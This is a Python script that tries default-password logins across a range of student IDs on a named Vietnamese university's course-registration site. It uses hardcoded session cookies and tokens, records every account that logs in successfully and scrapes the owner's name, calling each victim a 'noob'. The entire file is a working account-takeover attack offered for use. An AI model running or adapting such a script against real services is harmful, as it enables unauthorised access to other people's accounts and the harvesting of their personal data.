import requests
from scrapy.selector import Selector

url = 'http://dangkyhoc.vnu.edu.vn/dang-nhap'
username = ''
password = ''

headers = {
    'Content-Type:' 'application/x-www-form-urlencoded',
}

cookies = {
    '__RequestVerificationToken': '5edchCfU0sEuGlraxYMBfDa7Qv0YppkIromnq-sEmrj815ERzttvBRonJGUqTaRlxCi9JjyTkfjNTPHyXDOAhE24vEI1',
    'ASP.NET_SessionId': '5iqxbpsfj12cbs3zyzlhtt3j'
}

f = open('out.txt', 'a')

i = 1
noob_count = 0
retries = 0
prefix = '1702'
while i < 2000:
    s = requests.Session()
    username = prefix + str(i).zfill(4)
    password = username
    payload = {
        '__RequestVerificationToken': 'U0ejF3FU2EXSVnIHo1I7CLw1GfC3BwSnED1wzAHjH3itk-s6FI8vh9VQ-Z3gevLqbUANXj940sVMQCe767JTHT9LbG41',
        'LoginName': '{}'.format(username),
        'Password': '{}'.format(password)
    }
    try:
        r = s.post(url, cookies=cookies, data=payload)
    except:
        i -= 1
        continue

    if r.status_code == 200:
        if not 'Đăng nhập' in r.text:
            name = Selector(text=r.text).xpath(
                '//span[@class="user-name"]/text()').get()[11:]
            print('Noob found: ', username, '-', name)
            f.write(username + '\n')
            noob_count += 1
            retries = 0
    else:
        # print(f'[{username}] Server error! Got status code {r.status_code}. Retrying...')
        retries += 1
        if retries == 10:
            print(f'[{username}] Maximum retries reached, skipping...')
            retries = 0
            i += 1
            continue
        i -= 1
    i += 1
print("Total noobs:", noob_count)
f.close()
